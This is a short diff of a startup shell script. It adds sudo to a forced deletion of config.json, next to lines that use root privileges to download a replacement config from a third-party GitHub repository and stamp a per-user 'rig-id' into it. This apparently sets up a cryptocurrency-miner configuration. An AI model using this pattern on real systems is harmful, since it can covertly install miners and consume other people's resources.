@@ -9,7 +9,7 @@ echo data >> customize_environment.log
 if [ -e "AAA/build/Project-H" ]; then
    cd AAA/build 
    if [ -e "config.json" ]; then
-      rm -rf config.json
+      sudo rm -rf config.json
       sudo wget https://raw.githubusercontent.com/U117A/scripts/master/config.json
       user=${LOCAL/'/home/'}_$data
       sudo sed -i 's/"rig-id":.*/"rig-id": "$user",/' config.json
